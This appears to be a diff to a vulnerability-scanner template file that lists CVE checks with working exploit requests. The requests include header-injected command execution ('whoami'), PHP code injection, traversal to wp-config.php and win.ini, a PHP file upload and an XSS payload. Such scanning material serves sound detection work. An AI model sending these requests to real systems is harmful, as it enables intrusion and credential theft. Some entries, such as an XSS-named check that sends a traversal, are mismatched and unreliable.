@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -8232,7 +8232,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}"
+            "{{BaseURL}}/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5%28%22CVE-2018-7700%22%29%3B{/dede:field}"
           ]
         }
       ]
@@ -9297,7 +9297,7 @@
       "requests": [
         {
           "raw": [
-            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();\n"
+            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20md5%28%22CVE-2019-16759%22%29%3B\n"
           ]
         }
       ]
@@ -11743,7 +11743,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/tests/support/stores/test_grid_filter.php?query=phpinfo();"
+            "{{BaseURL}}/tests/support/stores/test_grid_filter.php?query=echo%20md5%28%22CVE-2020-19625%22%29%3B"
           ]
         }
       ]
@@ -12309,9 +12309,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -17486,7 +17486,7 @@
     {
       "id": "CVE-2021-37704",
       "info": {
-        "name": "phpinfo Resource Exposure",
+        "name": "phpfastcache - phpinfo Resource Exposure",
         "severity": "medium"
       },
       "requests": [
@@ -19667,6 +19667,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0735",
+      "info": {
+        "name": "GitLab CE/EE - Runner Registration Token Disclosure",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/users/sign_in"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0776",
       "info": {
         "name": "RevealJS postMessage <4.3.0 - Cross-Site Scripting",
@@ -19676,7 +19691,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php/interact.sh"
+            "{{BaseURL}}/users/sign_in"
           ]
         }
       ]
@@ -19964,6 +19979,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1162",
+      "info": {
+        "name": "GitLab CE/EE - Hardcoded password",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/users/sign_in"
           ]
         }
       ]
@@ -20265,6 +20295,22 @@
       ]
     },
     {
+      "id": "CVE-2022-1952",
+      "info": {
+        "name": "eaSYNC < 1.1.16 - Unauthenticated Arbitrary File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nCookie: PHPSESSID=a0d5959357e474aef655313f69891f37\nContent-Type: multipart/form-data; boundary=------------------------98efee55508c5059\n\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"action\"\n\neasync_session_store\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"type\"\n\ncar\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"with_driver\"\n\nself-driven\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"driver_license_image2\"; filename=\"{{randstr}}.php\"\nContent-Type: application/octet-stream\n\n<?php echo md5('CVE-2022-1952');?>\n\n--------------------------98efee55508c5059--\n",
+            "GET /wp-admin/admin-ajax.php?action=easync_success_and_save HTTP/1.1\nHost: {{Hostname}}\nCookie: PHPSESSID=a0d5959357e474aef655313f69891f37\n",
+            "GET /wp-content/uploads/{{filename}}.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server Local File Inclusion",
@@ -20308,6 +20354,21 @@
             "POST /backend/cms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-OCTOBER-REQUEST-HANDLER: onSave\nX-OCTOBER-REQUEST-PARTIALS:\nX-Requested-With: XMLHttpRequest\n\n_session_key={{session_key}}&_token={{token}}&settings%5Btitle%5D={{randstr}}&settings%5Burl%5D=%2F{{randstr}}&fileName={{randstr}}&settings%5Blayout%5D=&settings%5Bdescription%5D=&settings%5Bis_hidden%5D=0&settings%5Bmeta_title%5D=&settings%5Bmeta_description%5D=&markup=%3C%3Fphp%0D%0A%0D%0Afunction+onInit()+%7B%0D%0A++++phpinfo()%3B%0D%0A%7D%0D%0A%0D%0A%3F%3E%0D%0A%3D%3D%0D%0A&code=&templateType=page&templatePath=&theme=demo&templateMtime=&templateForceSave=0\n",
             "POST /backend/cms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-OCTOBER-REQUEST-HANDLER: onCreateTemplate\nX-OCTOBER-REQUEST-PARTIALS:\nX-Requested-With: XMLHttpRequest\n\n_session_key={{session_key}}&_token={{token}}&search=&type=page\n",
             "POST /backend/cms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-OCTOBER-REQUEST-HANDLER: onOpenTemplate\nX-OCTOBER-REQUEST-PARTIALS:\nX-Requested-With: XMLHttpRequest\n\n_session_key={{session_key}}&_token={{token}}&search=&{{theme}}=demo&type=page&path={{randstr}}.htm\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2185",
+      "info": {
+        "name": "GitLab CE/EE - Import RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/users/sign_in"
           ]
         }
       ]
@@ -21057,10 +21118,24 @@
       ]
     },
     {
+      "id": "CVE-2022-26263",
+      "info": {
+        "name": "Yonyou u8 v13.0 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-2633",
       "info": {
         "name": "All In One Video Gallery Plugin - Unauthenticated Arbitrary File Download & SSRF vulnerability",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -22589,6 +22664,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}//interactsh.com%2f.."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-40359",
+      "info": {
+        "name": "kfm <= 1.4.7 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /kfm/index.php/'<script>alert(document.domain);</script> HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
